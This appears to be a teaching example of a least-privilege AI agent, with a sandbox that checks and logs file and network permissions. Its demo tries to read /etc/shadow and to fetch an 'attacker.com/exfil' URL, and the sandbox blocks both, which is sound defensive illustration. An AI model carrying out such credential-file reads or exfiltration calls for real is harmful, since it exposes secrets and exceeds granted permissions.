"""
ASI-02: Excessive Agent Capabilities — SECURE EXAMPLE (Agent OS)

This agent uses Agent OS CapabilitySandbox to enforce least-privilege
access. Only explicitly granted capabilities are permitted.
"""

from agent_os import CapabilitySandbox, ExecutionRing, AuditLogger


CAPABILITIES = {
    "agent": "file-processor",
    "ring": ExecutionRing.RING_3,  # Most restricted
    "filesystem": {
        "read": ["/data/reports/*", "/tmp/workspace/*"],
        "write": ["/tmp/workspace/*"],
        "delete": [],  # No delete permission
    },
    "network": {
        "allowed_domains": [],  # No network access
    },
}


class SecureAgent:
    """An agent with Agent OS capability sandboxing — least-privilege access."""

    def __init__(self, name: str, capabilities: dict):
        self.name = name
        self.sandbox = CapabilitySandbox(capabilities)
        self.audit = AuditLogger(agent_name=name)

    def read_file(self, path: str) -> str:
        if not self.sandbox.check_permission("filesystem.read", path):
            self.audit.log_blocked(action="read_file", target=path)
            raise PermissionError(f"Read access denied: {path}")

        self.audit.log_access(action="read_file", target=path)
        with open(path, "r") as f:
            return f.read()

    def write_file(self, path: str, content: str):
        if not self.sandbox.check_permission("filesystem.write", path):
            self.audit.log_blocked(action="write_file", target=path)
            raise PermissionError(f"Write access denied: {path}")

        self.audit.log_access(action="write_file", target=path)
        with open(path, "w") as f:
            f.write(content)

    def fetch_url(self, url: str) -> str:
        if not self.sandbox.check_permission("network.fetch", url):
            self.audit.log_blocked(action="fetch_url", target=url)
            raise PermissionError(f"Network access denied: {url}")

        import urllib.request
        with urllib.request.urlopen(url) as response:
            return response.read().decode()


if __name__ == "__main__":
    agent = SecureAgent("file-processor", CAPABILITIES)

    # Permitted — write to workspace
    agent.write_file("/tmp/workspace/report.txt", "Q4 summary")

    # BLOCKED — cannot read sensitive system files
    try:
        agent.read_file("/etc/shadow")
    except PermissionError as e:
        print(f"Blocked: {e}")

    # BLOCKED — no network access granted
    try:
        agent.fetch_url("http://attacker.com/exfil")
    except PermissionError as e:
        print(f"Blocked: {e}")
